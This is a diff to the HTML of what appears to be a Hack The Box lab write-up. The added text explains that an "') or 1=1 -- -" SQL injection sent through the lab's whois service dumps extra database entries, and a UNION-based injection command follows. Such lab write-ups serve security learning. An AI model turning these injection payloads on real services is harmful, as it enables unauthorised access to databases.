@@ -283,7 +283,15 @@ Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up
 
 <p>We can see here from the error output that the query contains a parantheses <code class="highlighter-rouge">)</code>.</p>
 
-<p>With this information we can start mapping our structure with <code class="highlighter-rouge">union</code>:</p>
+<p>Admittedley I tried to use a <code class="highlighter-rouge">1=1</code> query but I must have botched the command or missed the output as I assumed it didn’t work. However, a fellow HTB user kindly informed me that it does in fact work.</p>
+
+<p>So using the following command we can dump extra domain entries from the database:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">whois <span class="nt">-h</span> 10.10.10.155 <span class="nt">-p</span> 43 <span class="s2">"') or 1=1 -- -"</span></code></pre></figure>
+
+<p>To be honest I am quite happy I missed this because I learnt a lot going the long winded way as follows.</p>
+
+<p>With the error information we can start mapping our structure with <code class="highlighter-rouge">union</code>:</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash">whois <span class="nt">-h</span> scavenger.htb <span class="nt">-p</span> 43 <span class="nt">-H</span> <span class="s2">"') union all select null -- -"</span>                               
 % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
